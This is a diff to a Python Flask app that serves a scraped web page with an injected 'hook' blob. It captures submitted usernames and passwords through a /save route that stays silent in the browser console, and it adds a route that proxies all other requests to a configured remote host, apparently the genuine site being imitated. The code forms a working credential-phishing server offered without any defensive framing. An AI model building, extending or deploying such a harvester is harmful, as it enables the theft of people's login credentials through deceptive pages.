@@ -3,35 +3,39 @@ from flask import Flask, render_template, request, json
 from jinja2 import FileSystemLoader
 
 import sys
+import requests
 
 
 app = Flask(__name__)
-hook_shim_file="./hook.shim"
+
+config={}
 
 @app.route('/')
 def show_index():
 
     hook_blob = []
     try:
-       with open (hook_shim_file, "r") as shim:
+       with open (config['site']['server']['hook-shims'][0]['filename'], "r") as shim:
           hook_blob=shim.readlines()
     except EnvironmentError: # parent of IOError, OSError *and* WindowsError where available
        print("Shim file error", file=sys.stderr)
 
-    return render_template('index.html', hook_blob=hook_blob)
+    return render_template(config['site']['scraper']['urls'][0]['filename'], hook_blob=hook_blob)
 
-# Expected and accepted form parameters
-wFormFields = {'UserName': '', 'Password' : ''}
+@app.route('/<path:other>')
+def other(other):
+   remap_host = config['site']['server']['remap-host']
+   urlg="".join([remap_host,request.full_path])
+   print("Remapping request to %s" % urlg)
+   r = requests.get(urlg)
+   return r.content
 
-# We are not injecting CSRFs into our own scraped page, so relax the requirement
-# If we need to we can bring in CSRFProtect and then exclude routed as needed
-# Ex:
-# from flask_wtf.csrf import CSRFProtect
-# csrf = CSRFProtect(app)
-# @csrf.exempt
 
 @app.route("/save",  methods=['POST'])
 def save_data():
+
+    # Expected and accepted form parameters
+    wFormFields = {'UserName': '', 'Password' : ''}
     for field in wFormFields.keys(): 
 
        # Populate JSON data bag so you can extract relevant field easy.
@@ -49,5 +53,9 @@ def save_data():
     return '', 200 # We want to be quiet in browser console even if unknown error occurs, change to 400 to debug
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=8000)
+
+    config_file="./default.json"
+    with open(config_file) as config_file:
+        config = json.load(config_file)
+    app.run(debug=True, host=config['site']['server']['listen-host'], port=config['site']['server']['listen-port'])
 
